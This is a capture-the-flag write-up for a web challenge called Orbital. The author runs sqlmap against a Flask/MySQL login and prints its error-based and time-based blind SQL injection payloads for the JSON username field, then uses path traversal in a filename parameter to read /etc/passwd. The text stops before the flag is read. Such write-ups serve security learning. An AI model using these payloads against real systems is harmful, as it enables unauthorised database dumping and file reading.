Challenge description


> In order to decipher the alien communication that held the key to their location, she needed access to a decoder with advanced capabilities - a decoder that only The Orbital firm possessed. Can you get your hands on the decoder?

In this challenge also a login page is their.

And with no user info or details in source code I checked the docker files.

This challenge is similar to the `Drobots` challenge. Itâ€™s running `Flask` application with `MySQL`. So I looked into the docker file.

The `config.py` contains the database config info.

And `database.py` contain the database logic along with the hint but it is modified a little.
This time the `password` is getting verified with `passwordVerify`.

I again saved the request and gave it to `sqlmap`  which gave me the token and also bruteforced the password.


    sqlmap -r ./req --dbms=mysql -D orbital -T users --dump

    Parameter: JSON username ((custom) POST)
        Type: error-based
        Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
        Payload: {"username":"a"="a" AND (SELECT 2720 FROM(SELECT COUNT(*),CONCAT(0x716a7a6271,(SELECT (ELT(2720=2720,1))),0x71786a7671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND "a"="a","password":"a"}
    
        Type: time-based blind
        Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
        Payload: {"username":"a"="a" AND (SELECT 1000 FROM (SELECT(SLEEP(5)))dfxy) AND "a"="a","password":"a"}

Now once logged in the functionality of the website was different.

Now I checked the `routes.py` file which contained a logic of the application. Here in the logic of communication the hint was given that the file escape for characters are not there for the filename.

Then I tried the path traversal to get the `/etc/passwd` file. It worked.

For this challenge they changed the location of the flag name from `flag.txt` to `signal_sleuth_firmware` in root which is written in the docker config.


    COPY flag.txt /signal_sleuth_firmware

Now we need to get the flag.
